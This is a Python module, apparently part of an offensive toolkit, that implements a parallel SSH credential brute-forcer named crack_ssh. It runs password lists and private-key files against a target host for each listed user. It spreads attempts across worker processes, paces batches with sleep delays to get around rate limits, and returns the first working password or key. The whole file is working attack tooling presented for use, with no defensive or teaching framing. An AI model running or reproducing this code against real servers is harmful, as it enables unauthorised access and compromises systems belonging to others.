import os
import time
import multiprocessing
from typing import List, Optional
from concurrent.futures import ProcessPoolExecutor, as_completed


from ..core import check_batch_ssh_password, check_batch_ssh_keys

def _collect_key_paths(ssh_key: Optional[str], candidates: List[str]) -> List[str]:
    
    keys = []
    if ssh_key:
        if os.path.isfile(ssh_key):
            keys = [ssh_key]
        elif os.path.isdir(ssh_key):
            keys = [os.path.join(ssh_key, p) for p in os.listdir(ssh_key) if os.path.isfile(os.path.join(ssh_key, p))]
    else:
        keys = [c for c in candidates if os.path.exists(c) and os.path.isfile(c)]
    return keys

def crack_ssh(
    host: str,
    port: int,
    users: List[str],
    candidates: List[str],
    methods: Optional[List[str]] = None,
    ssh_key: Optional[str] = None,
    workers: Optional[int] = None,
    batch_size: int = 1000,
    limit: Optional[tuple] = None,
    verbose: bool = True,
    log_step: int = 1000,
    timeout: float = 5.0,
) -> Optional[str]:
    found = None
    if workers is None:
        workers = os.cpu_count() or 2

    if limit:
        chunk_size, delay = limit
    else:
        chunk_size, delay = len(candidates), 0

    if methods is None:
        methods = ["password"]

    methods = [m.lower() for m in methods]

    manager = multiprocessing.Manager()
    stop_event = manager.Event()

    if ssh_key:
        ssh_key = os.path.expanduser(ssh_key)

    key_paths = _collect_key_paths(ssh_key, candidates) if "key" in methods else []
    total_pw = len(candidates)
    total_key = len(key_paths)

    try:
        for user in users:
            if stop_event.is_set():
                break

            if verbose:
                print(f"[*] Brute start for user={user} | pw_candidates={total_pw} | key_candidates={total_key}", flush=True)

            for m in methods:
                if m == "key" and key_paths:
                    if verbose:
                        print(f"[*] Trying {len(key_paths)} key files for user {user}", flush=True)
                    with ProcessPoolExecutor(max_workers=workers) as executor:
                        futures = []
                        for i in range(0, len(key_paths), batch_size):
                            batch = key_paths[i:i+batch_size]
                            futures.append(executor.submit(
                                check_batch_ssh_keys,
                                host, port, user, batch, stop_event, i, len(key_paths), verbose, log_step, timeout
                            ))
                        for fut in as_completed(futures):
                            try:
                                res = fut.result()
                            except Exception as e:
                                if verbose:
                                    print(f"[!] Key worker exception: {e}", flush=True)
                                continue
                            if res:
                                found = f"KEY:{res}"
                                stop_event.set()
                                break
                    if found:
                        return found

                elif m == "password" and total_pw > 0:
                    for start in range(0, total_pw, chunk_size):
                        if stop_event.is_set():
                            break
                        end = min(start + chunk_size, total_pw)
                        current_batch = candidates[start:end]

                        if verbose:
                            print(f"[*] Processing password batch {start}-{end} of {total_pw} for user={user}", flush=True)

                        with ProcessPoolExecutor(max_workers=workers) as executor:
                            futures = []
                            for i in range(0, len(current_batch), batch_size):
                                sub = current_batch[i:i+batch_size]
                                futures.append(executor.submit(
                                    check_batch_ssh_password,
                                    host, port, user, sub, stop_event, start + i, total_pw, verbose, log_step, timeout
                                ))
                            for fut in as_completed(futures):
                                try:
                                    res = fut.result()
                                except Exception as e:
                                    if verbose:
                                        print(f"[!] Password worker exception: {e}", flush=True)
                                    continue
                                if res:
                                    found = f"PASS:{res}"
                                    stop_event.set()
                                    break
                        if found:
                            return found

                        if delay > 0 and end < total_pw:
                            if verbose:
                                print(f"[*] Limit reached ({end}/{total_pw}), sleeping {delay}s...", flush=True)
                            time.sleep(delay)

        if not found and verbose:
            print("[-] No credential found.", flush=True)
        return found

    except KeyboardInterrupt:
        if verbose:
            print("\n[!] Interrupted by user, exiting...", flush=True)
        return None
